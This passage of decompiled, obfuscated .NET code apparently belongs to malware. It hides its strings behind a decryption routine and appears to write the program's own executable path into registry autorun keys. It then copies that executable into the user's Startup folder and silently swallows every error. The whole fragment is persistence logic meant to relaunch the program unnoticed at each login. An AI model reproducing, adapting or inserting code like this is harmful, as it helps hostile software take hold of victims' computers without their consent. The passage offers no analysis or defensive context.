			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null);
			string text = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
			object[] array = new object[2] { string_10, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, text, array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			string text2 = GClass4.smethod_0("[Ţɲ\u0353ѥկٷݤ");
			object[] array4 = new object[2]
			{
				string_5,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
			};
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, text2, array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("@Ťɩ\u0368ѤՊ٧ݦ\u086c४੬\u0b64"), new object[0], (string[])null, (Type[])null, (bool[])null);
			string text3 = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
			object[] array7 = new object[2] { string_10, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, text3, array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			string text4 = GClass4.smethod_0("[Ţɲ\u0353ѥկٷݤ");
			object[] array9 = new object[2]
			{
				string_5,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
			};
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, text4, array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + GClass4.smethod_0("]") + string_5 + GClass4.smethod_0("*Ŧɺ\u0364"), overwrite: true);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(1000);
	}
}
